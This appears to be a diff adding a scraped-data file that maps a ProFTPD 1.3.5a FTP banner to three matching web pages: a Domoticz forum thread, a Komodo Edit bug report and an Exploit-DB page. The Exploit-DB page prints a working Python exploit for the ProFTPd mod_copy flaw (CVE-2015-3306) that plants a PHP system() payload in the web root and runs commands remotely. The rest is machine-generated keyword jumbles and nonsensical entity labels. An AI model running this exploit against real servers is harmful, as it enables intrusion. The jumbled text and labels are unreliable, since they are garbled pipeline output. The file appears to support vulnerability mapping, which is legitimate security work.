@@ -1,0 +1,4611 @@
+Raw Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://www.domoticz.com/forum/viewtopic.php?t=10366===============================
+
+[Solved] FTP connection to NAS fails - Domoticz
+Skip to content
+Search
+Advanced search
+Quick links
+Unanswered topics
+Active topics
+Search
+Members
+The team
+FAQ
+Wiki
+Login
+Register
+Board index
+Domoticz
+Installation, Compiling, Permissions, Security and Starting
+Search
+[Solved] FTP connection to NAS fails
+On various Hardware and OS systems:
+pi / windows / routers / nas, etc
+Moderator: leecollings
+Post Reply
+Print view
+Search
+Advanced search
+3 posts
+• Page 1 of 1
+ReneF
+Posts: 5 Joined: Friday 29 January 2016 14:46
+Target OS: Raspberry Pi
+Domoticz version: V2.3530
+Location: Berkhout
+Contact:
+Contact ReneF
+Send private message
+[Solved] FTP connection to NAS fails
+Quote
+Post
+by ReneF » Wednesday 03 February 2016 1:20
+I implemented the Domoticz_backup.sh script according the Wiki (Daily backup to external hdd) with the only changes made in IP numbers and user name and password.
+Running the test via a SSH connection I get a 530 access denied message.
+(see below) On my NAS the user has all right's for access. Trying the path directly in a web browser works fine, including logging in on the NAS using the username and password
+About to connect() to 192.168.1.40 port 21 (#0)
+*
+Trying 192.168.1.40...
+* connected
+* Connected to 192.168.1.40 (192.168.1.40) port 21 (#0)
+* FTP 0x174afb8 state change from STOP to WAIT220
+< 220 NASFTPD Turbo station 1.3.5a Server (ProFTPD) [192.168.1.40]
+> USER “user”
+* FTP 0x174afb8 state change from WAIT220 to USER
+< 331 Password required for “user”
+> PASS “password”
+* FTP 0x174afb8 state change from USER to PASS
+< 530 Login incorrect.
+* Access denied: 530
+* Closing connection #0
+Does any one have a suggestion what could be the case?
+Last edited by ReneF on Thursday 04 February 2016 0:00, edited 1 time in total.
+Top
+pepijn
+Posts: 511 Joined: Friday 12 July 2013 13:19
+Target OS: Raspberry Pi
+Domoticz version:
+Location: The Netherlands
+Contact:
+Contact pepijn
+Send private message
+Re: FTP connection to NAS fails
+Quote
+Post
+by pepijn » Wednesday 03 February 2016 1:56
+Try to remove the quotes
+Top
+ReneF
+Posts: 5 Joined: Friday 29 January 2016 14:46
+Target OS: Raspberry Pi
+Domoticz version: V2.3530
+Location: Berkhout
+Contact:
+Contact ReneF
+Send private message
+Re: FTP connection to NAS fails
+Quote
+Post
+by ReneF » Wednesday 03 February 2016 11:09
+Thanks Pepijn.
+You're suggestion worked. Maybe a good idea to mention this in the wiki.
+Secondly I discovered that the NAS does not allow to write to a directory that is not created before running this script (see below)
+> CWD Domoticz_backup
+< 550 Domoticz_backup: No such file or directory
+* Server denied you to change to the given directory
+Rene
+Top
+Post Reply
+Print view
+Display: All posts1 day7 days2 weeks1 month3 months6 months1 year
+Sort by: AuthorPost timeSubject
+Direction: AscendingDescending
+3 posts
+• Page 1 of 1
+Return to “Installation, Compiling, Permissions, Security and Starting”
+Jump to
+General
+↳   News & Updates
+↳   General Discussion
+↳   Bugs and Problems
+↳   Other questions and discussions
+↳   Suggestions
+Domoticz
+↳   Installation, Compiling, Permissions, Security and Starting
+↳   Cameras
+↳   Switches and Scenes
+↳   Utility
+↳   Temperature and Weather
+↳   Heating/cooling
+↳   OpenTherm gateway
+↳   Third party and supplementary tools
+↳   Android
+↳   iOS
+↳   Windows
+↳   Kodi (XBMC)
+↳   Domoboard
+↳   Dashticz
+↳   Design, usability and languages
+↳   Language / Translation
+Scripting & automation
+↳   dzVents
+↳   Bugs
+↳   Examples & Solutions
+↳   LUA
+↳   Bash / PowerShell / Batch etc.
+↳   Blockly
+↳   Python
+↳   PHP and all others
+Hardware and Protocols
+↳   Z-Wave
+↳   Device information
+↳   Others
+↳   Zigbee
+↳   Speech & Voice Systems
+↳   433 & 868 transceiver
+↳   RFLink Transceiver
+↳   Rfxcom Transceiver
+↳   DIY Hardware and Protocols
+↳   ESP8266
+↳   PiFace
+↳   Raspberry Pi GPIO ( WiringPi )
+↳   MySensors
+↳   1-wire
+Community
+↳   Sales, Deals and Bargains..
+↳   Deals & bargains
+↳   Forum feedback
+↳   Show your projects
+↳   Projects on other sites
+Who is online
+Users browsing this forum: No registered users and 1 guest
+Board index
+All times are UTC+02:00
+Delete cookies
+Members
+The team
+Powered by phpBB® Forum Software © phpBB Limited
+Privacy
+|
+Terms
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://www.domoticz.com/forum/viewtopic.php?t=10366===============================
+
+ content search advanced search quick links unanswered topics active topics search members leecollings post reply print view search advanced search 3 posts • page 1 868 transceiver ↳ rflink transceiver ↳ rfxcom transceiver ↳ diy hardware wave ↳ device information ↳ others ↳ zigbee ↳ speech supplementary tools ↳ android ↳ ios ↳ windows ↳ kodi posts1 day7 days2 weeks1 month3 months6 months1 year sort given directory rene top post reply print view display protocols ↳ esp8266 ↳ piface ↳ raspberry pi gpio phpbb ® forum software © phpbb limited privacy team faq wiki login register board index domoticz installation cooling ↳ opentherm gateway ↳ third party automation ↳ dzvents ↳ bugs ↳ examples renef » wednesday 03 february 2016 11 renef » wednesday 03 february 2016 1 pepijn » wednesday 03 february 2016 1 ascendingdescending 3 posts • page 1 ↳ domoboard ↳ dashticz ↳ design ↳ blockly ↳ python ↳ php updates ↳ general discussion ↳ bugs discussions ↳ suggestions domoticz ↳ installation bargains ↳ forum feedback ↳ show solutions ↳ lua ↳ bash scenes ↳ utility ↳ temperature thursday 04 february 2016 0 starting ↳ cameras ↳ switches friday 29 january 2016 14 friday 12 july 2013 13 220 nasftpd turbo station 1 contact renef send private message contact pepijn send private message ↳ mysensors ↳ 1 1 guest board index raspberry pi domoticz version 40 port 21 (# 0 quotes top renef posts wire community ↳ sales 00 delete cookies members bargains .. ↳ deals nas fails quote post voice systems ↳ 433 port 21 (# 0 web browser works fine top pepijn posts protocols ↳ z 1 renef posts general ↳ news starting search ftp 0x174afb8 state change weather ↳ heating projects ↳ projects languages ↳ language user “ user ” 530 access denied message pass “ password ” 530 login incorrect others hardware edited 1 time 09 thanks pepijn starting ” jump “ user ” authorpost timesubject direction “ installation 46 target os 331 password required 19 target os problems ↳ online users browsing sh script according team powered domoticz skip various hardware 1 return 3 os systems windows netherlands contact berkhout contact nas fails wiki ftp connection forum directory access denied 1 user name pi server denied 40 ... renef registered users last edited nas using translation scripting test via ssh connection path directly ip numbers including logging good idea external hdd etc moderator daily backup connect () closing connection changes made batch etc 5a server 56 try 511 joined 5 joined 0 cwd domoticz_backup 550 domoticz_backup suggestion worked 3530 location trying 192 user password 530 40 pass deals change 00 access nas script domoticz_backup trying suggestion location 192 xbmc write wiringpi wait220 v2 utc username usability total times terms stop solved sites see security secondly running routers right remove questions proftpd powershell permissions one mention maybe implemented get file discovered created could connected compiling case allow 20 168 02
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [
+    "team"
+  ],
+  "device_types": [],
+  "products": [
+    "posts1",
+    "day7",
+    "days2",
+    "weeks1",
+    "month3",
+    "months6",
+    "months1",
+    "esp8266",
+    "x174afb8",
+    "wait220",
+    "v2"
+  ]
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://github.com/Komodo/KomodoEdit/issues/3126===============================
+
+Linux version timeouts when trying connect to FTP server. · Issue #3126 · Komodo/KomodoEdit · GitHub
+Skip to content
+Why GitHub?
+Features →
+Code review
+Project management
+Integrations
+Actions
+Package registry
+Team management
+Social coding
+Documentation
+Code hosting
+Customer stories →
+Security →
+Enterprise
+Explore
+Explore GitHub →
+Learn & contribute
+Topics
+Collections
+Trending
+Learning Lab
+Open source guides
+Connect with others
+Events
+Community forum
+GitHub Education
+Marketplace
+Pricing
+Plans →
+Compare plans
+Contact Sales
+Nonprofit →
+Education →
+In this repository
+All GitHub
+↵
+Jump to
+↵
+No suggested jump to results
+In this repository
+All GitHub
+↵
+Jump to
+↵
+In this repository
+All GitHub
+↵
+Jump to
+↵
+Sign in
+Sign up
+Watch
+85
+Star
+1,075
+Fork
+233
+Komodo/KomodoEdit
+Code
+Issues
+1,102
+Pull requests
+25
+Projects
+0
+Wiki
+Security
+Insights
+Dismiss
+Join GitHub today
+GitHub is home to over 36 million developers working together to host and review code, manage projects, and build software together.
+Sign up
+New issue
+Have a question about this project? Sign up for a free GitHub account to open an issue and contact its maintainers and the community.
+Pick a username
+Email Address
+Password
+Sign up for GitHub
+By clicking “Sign up for GitHub”, you agree to our terms of service and
+privacy statement. We’ll occasionally send you account related emails.
+Already on GitHub?
+Sign in
+to your account
+Linux version timeouts when trying connect to FTP server.
+#3126
+Open
+edwardjong2
+opened this issue
+Sep 19, 2017
+· 1 comment
+Open
+Linux version timeouts when trying connect to FTP server.
+#3126
+edwardjong2
+opened this issue
+Sep 19, 2017
+· 1 comment
+Comments
+Assignees
+th3coop
+Labels
+Type: Bug
+Projects
+None yet
+Milestone
+11.x.x
+3 participants
+Copy link
+Quote reply
+edwardjong2
+commented
+Sep 19, 2017
+•
+edited
+Short Summary
+Linux version timeouts when trying connect to FTP server.
+Steps to Reproduce
+1 Click on Preference in the middle of the screen.
+2 Click on Servers and enter the credentials for ftps.activatestate.com
+3 Click on the hamburger menu and select Open->Remote File
+4 In Open File, select the ‘Test’ Server
+Expected results
+1 The files from the 'Test Server' should be accessible.
+Actual results
+1 The Komodo screen will darken.
+2 6 The Komodo will display the following JavaScript Application error message:
+Error: ‘timed out’
+Platform Information
+Komodo IDE, version 11.0.0 build 90667, platform linux-x86_64.
+Built on Fri Sep 15 15:48:05 2017.
+Ubuntu 16.04 LTS
+Additional Information
+pystderr.log.txt
+There is no problem when using ftp to get to the ftp server.
+$ ftp ftps.activestate.com
+Connected to ftps.activestate.com.
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Name (ftps.activestate.com:edwardj): qa
+331 Password required for qa
+Password:
+230 User qa logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> exit
+221 Goodbye.
+This comment has been minimized.
+Sign in to view
+Copy link
+Quote reply
+Member
+Naatan
+commented
+Sep 19, 2017
+The issue here is not the timeout but rather the fact that Komodo's UI is blocked by it.
+Naatan
+assigned
+th3coop
+Sep 19, 2017
+Naatan
+added this to the
+11.x.x milestone
+Sep 19, 2017
+Naatan
+added
+the
+Type: Bug
+label
+Sep 19, 2017
+Sign up for free
+to join this conversation on GitHub.
+Already have an account?
+Sign in to comment
+© 2019 GitHub, Inc.
+Terms
+Privacy
+Security
+Status
+Help
+Contact GitHub
+Pricing
+API
+Training
+Blog
+About
+You can’t perform that action at this time.
+You signed in with another tab or window. Reload to refresh your session.
+You signed out in another tab or window. Reload to refresh your session.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://github.com/Komodo/KomodoEdit/issues/3126===============================
+
+ features → code review project management integrations actions package registry team management social coding documentation code hosting customer stories → security → enterprise explore explore github → learn others events community forum github education marketplace pricing plans → compare plans contact sales nonprofit → education → 102 pull requests 25 projects 0 wiki security insights dismiss join github today github terms privacy security status help contact github pricing api training blog x 3 participants copy link quote reply edwardjong2 commented sep 19 contribute topics collections trending learning lab open source guides connect view copy link quote reply member naatan commented sep 19 2017 · 1 comment comments assignees th3coop labels type 2017 • edited short summary linux version timeouts 2017 · 1 comment open linux version timeouts ‘ test ’ server expected results 1 edwardj ): qa 331 password required bug projects none yet milestone 11 review code naatan assigned th3coop sep 19 select open -> remote file 4 komodoedit code issues 1 220 nasftpd turbo station 1 04 lts additional information pystderr 36 million developers working together following javascript application error message comment © 2019 github komodoedit · github skip x milestone sep 19 username email address password sign bug label sep 19 ’ platform information komodo ide account linux version timeouts 3126 open edwardjong2 opened fri sep 15 15 watch 85 star 1 230 user qa logged linux version timeouts 075 fork 233 komodo project issue sep 19 free github account github ↵ jump 2017 naatan added 3126 edwardjong2 opened actual results 1 0 build 90667 remote system type 3126 · komodo github ”, reproduce 1 click contact build software together com 3 click community manage projects github open file exit 221 goodbye account related emails clicking “ sign using binary mode privacy statement platform linux qa password version 11 trying connect test server join 2017 sign · issue 05 2017 ‘ timed terms 0 comment x 5a server open ftp server 3 2017 2 click ↵ sign suggested jump komodo screen ’ type using ftp ubuntu 16 occasionally send new issue hamburger menu com connected another tab 2 6 results transfer files select ftp ftps komodo error 11 account sign ↵ issue free com ftp screen ftps files x86_64 window unix ui txt timeout time steps signed session service servers repository reload refresh rather question proftpd problem preference pick perform name minimized middle maintainers log inc host home get fact enter display darken credentials conversation content built blocked already agree activestate activatestate action accessible 48
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [
+    "star",
+    "team"
+  ],
+  "device_types": [
+    "watch"
+  ],
+  "products": [
+    "edwardjong2",
+    "th3coop",
+    "x86"
+  ]
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[{"vendor": "star", "device_type": "watch"}, {"vendor": "team", "device_type": "watch"}]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://www.exploit-db.com/exploits/36803===============================
+
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution
+Exploit Database
+Exploits
+GHDB
+Papers
+Shellcodes
+Search EDB
+SearchSploit Manual
+Submissions
+Online Training
+PWK
+Penetration Testing with Kali
+AWAE
+Advanced Web Attacks
+WiFu
+Wireless Attacks
+Offsec Resources
+Stats
+About Us
+About Exploit-DB
+Exploit-DB History
+FAQ
+Search
+GET CERTIFIED
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution
+EDB-ID:
+36803
+CVE:
+2015-3306
+EDB Verified:
+Author:
+R-73eN
+Type:
+remote
+Exploit:
+/
+Platform:
+Linux
+Date:
+2015-04-21
+Vulnerable App:
+Become a Certified Penetration Tester
+Enroll in
+Penetration Testing with Kali Linux
+, the course
+required to become an
+Offensive Security Certified Professional (OSCP)
+GET CERTIFIED
+# Title: ProFTPd 1.3.5 Remote Command Execution
+# Date : 20/04/2015
+# Author: R-73eN
+# Software: ProFTPd 1.3.5 with mod_copy
+# Tested : Kali Linux 1.06
+# CVE : 2015-3306
+# Greetz to Vadim Melihow for all the hard work .
+import socket
+import sys
+import requests
+#Banner
+banner = ""
+banner += "
+___
+__
+____
+_
+_
+\n"
+banner +=" |_ _|_ __
+/ _| ___
+/ ___| ___ _ __
+/ \
+| |
+\n"
+banner +="
+| || '_ \| |_ / _ \| |
+_ / _ \ '_ \
+/ _ \ | |
+\n"
+banner +="
+| || | | |
+_| (_) | |_| |
+__/ | | |
+/ ___ \| |___ \n"
+banner +=" |___|_| |_|_|
+\___/ \____|\___|_| |_| /_/
+\_\_____|\n\n"
+print banner
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+if(len(sys.argv) < 4):
+print '\n Usage : exploit.py server directory cmd'
+else:
+server = sys.argv[1] #Vulnerable Server
+directory = sys.argv[2] # Path accessible from web .....
+cmd = sys.argv[3] #PHP payload to be executed
+evil = '<?php system("' + cmd + '") ?>'
+s.connect((server, 21))
+s.recv(1024)
+print '[ + ] Connected to server [ + ] \n'
+s.send('site cpfr /etc/passwd')
+s.recv(1024)
+s.send('site cpto ' + evil)
+s.recv(1024)
+s.send('site cpfr /proc/self/fd/3')
+s.recv(1024)
+s.send('site cpto ' + directory + 'infogen.php')
+s.recv(1024)
+s.close()
+print '[ + ] Payload sended [ + ]\n'
+print '[ + ] Executing Payload [ + ]\n'
+r = requests.get('http://' + server + '/infogen.php') #Executing PHP payload through HTTP
+if (r.status_code == 200):
+print '[ * ] Payload Executed Succesfully [ * ]'
+else:
+print ' [ - ] Error : ' + str(r.status_code) + ' [ - ]'
+print '\n http://infogen.al/'
+Tags:
+Advisory/Source:
+Link
+Downloads
+Certifications
+Training
+Professional Services
+Kali Linux
+OSCP
+Penetration Testing with Kali Linux (PWK)
+Penetration Testing
+Kali NetHunter
+OSWP
+Advanced Web Attacks and Exploitation (AWAE)
+Advanced Attack Simulation
+Kali Linux Revealed Book
+OSCE
+Offensive Security Wireless Attacks (WiFu)
+Application Security Assessment
+OSEE
+Cracking the Perimeter (CTP)
+OSWE
+Metasploit Unleashed (MSFU)
+KLCP
+Free Kali Linux Training
+Downloads
+Kali Linux
+Kali NetHunter
+Kali Linux Revealed Book
+Certifications
+OSCP
+OSWP
+OSCE
+OSEE
+OSWE
+KLCP
+Training
+Penetration Testing with Kali Linux (PWK)
+Advanced Web Attacks and Exploitation (AWAE)
+Offensive Security Wireless Attacks (WiFu)
+Cracking the Perimeter (CTP)
+Metasploit Unleashed (MSFU)
+Free Kali Linux training
+Pro Services
+Penetration Testing
+Advanced Attack Simulation
+Application Security Assessment
+Exploit Database by Offensive Security
+Terms
+Privacy
+About Us
+FAQ
+©
+Copyright 2019, Exploit Database
+About The Exploit Database
+×
+The Exploit Database is maintained by Offensive Security, an information security training company
+that provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is a
+non-profit project that is provided as a public service by Offensive Security.
+The Exploit Database is a CVE
+compliant archive of public exploits and corresponding vulnerable software,
+developed for use by penetration testers and vulnerability researchers. Our aim is to serve
+the most comprehensive collection of exploits gathered through direct submissions, mailing
+lists, as well as other public sources, and present them in a freely-available and
+easy-to-navigate database. The Exploit Database is a repository for exploits and
+proof-of-concepts rather than advisories, making it a valuable resource for those who need
+actionable data right away.
+The Google Hacking Database (GHDB)
+is a categorized index of Internet search engine queries designed to uncover interesting,
+and usually sensitive, information made publicly available on the Internet. In most cases,
+this information was never meant to be made public but due to any number of factors this
+information was linked in a web document that was crawled by a search engine that
+subsequently followed that link and indexed the sensitive information.
+The process known as “Google Hacking” was popularized in 2000 by Johnny
+Long, a professional hacker, who began cataloging these queries in a database known as the
+Google Hacking Database. His initial efforts were amplified by countless hours of community
+member effort, documented in the book Google Hacking For Penetration Testers and popularised
+by a barrage of media attention and Johnny’s talks on the subject such as this early talk
+recorded at DEFCON 13. Johnny coined the term “Googledork” to refer
+to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
+the fact that this was not a “Google problem” but rather the result of an often
+unintentional misconfiguration on the part of a user or a program installed by the user.
+Over time, the term “dork” became shorthand for a search query that located sensitive
+information and “dorks” were included with may web application vulnerability releases to
+show examples of vulnerable web sites.
+After nearly a decade of hard work by the community, Johnny turned the GHDB
+over to Offensive Security in November 2010, and it is now maintained as
+an extension of the Exploit Database. Today, the GHDB includes searches for
+other online search engines such as Bing,
+and other online repositories like GitHub,
+producing different, yet equally valuable results.
+Close
+Offensive Security Resources
+×
+Downloads
+Certifications
+Training
+Services
+Kali Linux
+OSCP
+Penetration Testing with Kali Linux (PWK)
+Penetration Testing
+Kali NetHunter
+OSWP
+Offensive Security Wireless Attacks (WiFu)
+Advanced Attack Simulation
+Kali Linux Revealed Book
+OSCE
+Cracking the Perimeter (CTP)
+Application Security Assessment
+OSEE
+Advanced Web Attacks (AWAE)
+OSWE
+Metasploit Unleashed (MSFU)
+KLCP
+Free Kali Linux training
+Close
+Search The Exploit Database
+×
+Title
+CVE
+Type
+dos
+local
+remote
+shellcode
+papers
+webapps
+Platform
+AIX
+ASP
+BSD
+BSD_PPC
+BSD_x86
+BSDi_x86
+CGI
+FreeBSD
+FreeBSD_x86
+FreeBSD_x86-64
+Generator
+Hardware
+HP-UX
+IRIX
+JSP
+Linux
+Linux_MIPS
+Linux_PPC
+Linux_SPARC
+Linux_x86
+Linux_x86-64
+MINIX
+Multiple
+NetBSD_x86
+Novell
+OpenBSD
+OpenBSD_x86
+OSX_PPC
+OSX
+PHP
+Plan9
+QNX
+SCO
+SCO_x86
+Solaris
+Solaris_SPARC
+Solaris_x86
+Tru64
+ULTRIX
+Unix
+UnixWare
+Windows_x86
+Windows_x86-64
+Windows
+ARM
+CFM
+Netware
+SuperH_SH4
+Java
+BeOS
+Immunix
+Palm_OS
+AtheOS
+iOS
+Android
+XML
+Perl
+Python
+System_z
+JSON
+ASHX
+Ruby
+ASPX
+macOS
+Linux_CRISv32
+eZine
+Magazine
+NodeJS
+Alpha
+Solaris_MIPS
+Lua
+Author
+Content
+Port
+14
+21
+22
+23
+25
+42
+49
+53
+66
+69
+70
+79
+80
+81
+102
+105
+110
+111
+113
+119
+123
+135
+139
+143
+161
+162
+164
+383
+389
+402
+406
+411
+443
+444
+445
+446
+502
+504
+513
+514
+515
+532
+548
+554
+555
+617
+623
+631
+655
+689
+783
+787
+808
+873
+888
+901
+998
+1000
+1040
+1089
+1099
+1100
+1114
+1120
+1194
+1235
+1471
+1521
+1533
+1581
+1589
+1604
+1617
+1723
+1743
+1761
+1812
+1858
+1861
+1900
+1947
+2000
+2022
+2049
+2100
+2103
+2121
+2125
+2181
+2242
+2315
+2375
+2380
+2381
+2401
+2480
+2525
+2640
+2810
+2812
+2947
+2954
+2990
+3000
+3030
+3050
+3052
+3128
+3129
+3181
+3200
+3217
+3306
+3333
+3378
+3460
+3465
+3500
+3535
+3632
+3690
+3790
+3814
+3817
+4000
+4002
+4070
+4081
+4105
+4111
+4322
+4343
+4434
+4501
+4555
+4592
+4661
+4750
+4848
+5000
+5060
+5061
+5080
+5081
+5093
+5151
+5180
+5247
+5250
+5272
+5308
+5432
+5466
+5554
+5555
+5600
+5655
+5666
+5800
+5803
+5814
+5858
+5900
+5984
+6066
+6070
+6080
+6082
+6101
+6112
+6129
+6502
+6503
+6660
+6667
+7001
+7002
+7070
+7071
+7080
+7100
+7144
+7210
+7272
+7290
+7426
+7443
+7510
+7547
+7649
+7770
+7777
+7778
+7787
+7879
+7902
+8000
+8001
+8002
+8004
+8008
+8020
+8022
+8023
+8028
+8030
+8080
+8081
+8082
+8088
+8090
+8181
+8300
+8400
+8443
+8445
+8473
+8500
+8585
+8619
+8800
+8812
+8839
+8880
+8888
+9000
+9001
+9002
+9080
+9090
+9091
+9100
+9124
+9200
+9251
+9256
+9443
+9447
+9784
+9788
+9855
+9876
+9900
+9987
+9993
+9999
+10000
+10001
+10080
+10202
+10203
+10443
+10616
+11000
+11211
+11460
+12203
+12221
+12345
+12397
+12401
+13327
+13701
+13722
+13838
+16992
+18821
+18881
+19000
+19810
+19813
+20000
+20010
+20031
+20111
+20171
+22003
+23423
+25672
+26000
+27015
+27700
+28015
+30000
+30303
+31337
+32400
+32674
+32764
+34205
+37215
+37777
+37848
+38292
+40007
+41523
+44334
+46824
+48080
+49152
+50000
+50496
+52311
+52789
+52869
+52986
+53413
+54345
+54890
+55554
+55555
+56380
+57772
+58080
+62514
+Tag
+WordPress Core
+Metasploit Framework (MSF)
+WordPress Plugin
+SQL Injection (SQLi)
+Cross-Site Scripting (XSS)
+File Inclusion (LFI/RFI)
+Cross-Site Request Forgery (CSRF)
+Denial of Service (DoS)
+Code Injection
+Command Injection
+Authentication Bypass / Credentials Bypass (AB/CB)
+Client Side
+Use After Free (UAF)
+Out Of Bounds
+Remote
+Local
+XML External Entity (XXE)
+Integer Overflow
+Server-Side Request Forgery (SSRF)
+Race Condition
+NULL Pointer Dereference
+Malware
+Buffer Overflow
+Heap Overflow
+Type Confusion
+Object Injection
+Bug Report
+Console
+Pwn2Own
+Traversal
+Deserialization
+Verified
+Has App
+No Metasploit
+Search
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://www.exploit-db.com/exploits/36803===============================
+
+ 64 windows arm cfm netware superh_sh4 java beos immunix palm_os atheos ios android xml perl python system_z json ashx ruby aspx macos linux_crisv32 ezine magazine nodejs alpha solaris_mips lua author content port 14 21 22 23 25 42 49 53 66 69 70 79 80 81 102 105 110 111 113 119 123 135 139 143 161 162 164 383 389 402 406 411 443 444 445 446 502 504 513 514 515 532 548 554 555 617 623 631 655 689 783 787 808 873 888 901 998 1000 1040 1089 1099 1100 1114 1120 1194 1235 1471 1521 1533 1581 1589 1604 1617 1723 1743 1761 1812 1858 1861 1900 1947 2000 2022 2049 2100 2103 2121 2125 2181 2242 2315 2375 2380 2381 2401 2480 2525 2640 2810 2812 2947 2954 2990 3000 3030 3050 3052 3128 3129 3181 3200 3217 3306 3333 3378 3460 3465 3500 3535 3632 3690 3790 3814 3817 4000 4002 4070 4081 4105 4111 4322 4343 4434 4501 4555 4592 4661 4750 4848 5000 5060 5061 5080 5081 5093 5151 5180 5247 5250 5272 5308 5432 5466 5554 5555 5600 5655 5666 5800 5803 5814 5858 5900 5984 6066 6070 6080 6082 6101 6112 6129 6502 6503 6660 6667 7001 7002 7070 7071 7080 7100 7144 7210 7272 7290 7426 7443 7510 7547 7649 7770 7777 7778 7787 7879 7902 8000 8001 8002 8004 8008 8020 8022 8023 8028 8030 8080 8081 8082 8088 8090 8181 8300 8400 8443 8445 8473 8500 8585 8619 8800 8812 8839 8880 8888 9000 9001 9002 9080 9090 9091 9100 9124 9200 9251 9256 9443 9447 9784 9788 9855 9876 9900 9987 9993 9999 10000 10001 10080 10202 10203 10443 10616 11000 11211 11460 12203 12221 12345 12397 12401 13327 13701 13722 13838 16992 18821 18881 19000 19810 19813 20000 20010 20031 20111 20171 22003 23423 25672 26000 27015 27700 28015 30000 30303 31337 32400 32674 32764 34205 37215 37777 37848 38292 40007 41523 44334 46824 48080 49152 50000 50496 52311 52789 52869 52986 53413 54345 54890 55554 55555 56380 57772 58080 62514 tag wordpress core metasploit framework 64 minix multiple netbsd_x86 novell openbsd openbsd_x86 osx_ppc osx php plan9 qnx sco sco_x86 solaris solaris_sparc solaris_x86 tru64 ultrix unix unixware windows_x86 windows_x86 exploit database × title cve type dos local remote shellcode papers webapps platform aix asp bsd bsd_ppc bsd_x86 bsdi_x86 cgi freebsd freebsd_x86 freebsd_x86 race condition null pointer dereference malware buffer overflow heap overflow type confusion object injection bug report console pwn2own traversal deserialization verified klcp free kali linux training downloads kali linux kali nethunter kali linux revealed book certifications oscp oswp osce osee oswe klcp training penetration testing bounds remote local xml external entity remote command execution exploit database exploits ghdb papers shellcodes search edb searchsploit manual submissions online training pwk penetration testing wordpress plugin sql injection free kali linux training pro services penetration testing advanced attack simulation application security assessment exploit database author 2000 close offensive security resources × downloads certifications training services kali linux oscp penetration testing 3306 edb verified 64 generator hardware hp advanced attack simulation kali linux revealed book osce offensive security wireless attacks link downloads certifications training professional services kali linux oscp penetration testing 21 vulnerable app 21 )) 3306 oswe metasploit unleashed advanced attack simulation kali linux revealed book osce cracking kali awae advanced web attacks wifu wireless attacks offsec resources stats metasploit search penetration testing kali nethunter oswp offensive security wireless attacks metasploit unleashed penetration testing kali nethunter oswp advanced web attacks klcp free kali linux training close search ux irix jsp linux linux_mips linux_ppc linux_sparc linux_x86 linux_x86 application security assessment osee advanced web attacks high end penetration testing services db history faq search get certified proftpd 1 code injection command injection authentication bypass application security assessment osee cracking remote command execution edb provides various information security certifications ]' print '\ n http :// infogen 4 ): print '\ n usage offensive security wireless attacks term “ dork ” became shorthand exploit database × status_code == 200 ): print '[ 5 remote command execution information security training company kali linux 1 import socket import sys import requests may web application vulnerability releases kali linux need actionable data right away us faq © copyright 2019 offensive security certified professional certified penetration tester enroll advanced web attacks penetration testing offensive security terms privacy integer overflow server online repositories like github internet search engine queries designed close () print '[ book google hacking remote exploit online search engines exploit database term “ googledork ” 73en type get (' http ://' google hacking database send (' site cpto send (' site cpfr “ google problem ” yet equally valuable results “ google hacking ” offensive security ghdb includes searches linux date db exploit cve compliant archive py server directory cmd information made publicly available oscp direct submissions executing php payload penetration testers title platform free dos web ..... cmd revealed vulnerable web sites “ dorks ” navigate database database known pwk php payload _____ |\ n search engine php ') site request forgery 36803 cve get certified side request forgery often unintentional misconfiguration early talk recorded al /' tags connect (( server proftpd 1 located sensitive information exploit vulnerable server directory ____ |\ ___ "" banner += search query public exploits print '[ exploits gathered corresponding vulnerable software community member effort client side use payload executed succesfully professional hacker ghdb web document cve ___ __ ____ print banner wifu link exploits credentials bypass awae ]' else ]\ n vulnerability researchers sensitive information '/ infogen site scripting google “. valuable resource made public cracking executing payload payload sended banner banner usually sensitive banner +=" vadim melihow uncover interesting subsequently followed show examples public sources program installed profit project producing different process known print path accessible passwd ') november 2010 media attention mailing lists johnny ’ johnny turned johnny long johnny coined initial efforts inept person http hard work file inclusion executed evil draw attention defcon 13 course required countless hours comprehensive collection categorized index began cataloging n ___ \| “ sys status_code socket requests public service never meant concepts rather 3 ') 1 infogen information us queries internet server directory available 5 ___ use software community app __ service rather meant evil else date \| 73en 3 || xxe xss well user uaf today time tested talks subject str ssrf sqli source sock_stream serve self rfi result repository refer recv r provided proof proc present popularized popularised perimeter part number non nearly msfu msf mod_copy making maintained linked lfi len indexed included id greetz freely foolish fd factors fact extension exploitation etc error easy due documented developed denial decade ctp csrf cross crawled connected cb cases bing become barrage argv amplified aim af_inet advisory advisories ab 2015 20 2 1024 06 04 ''
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [
+    "arm",
+    "cgi"
+  ],
+  "device_types": [],
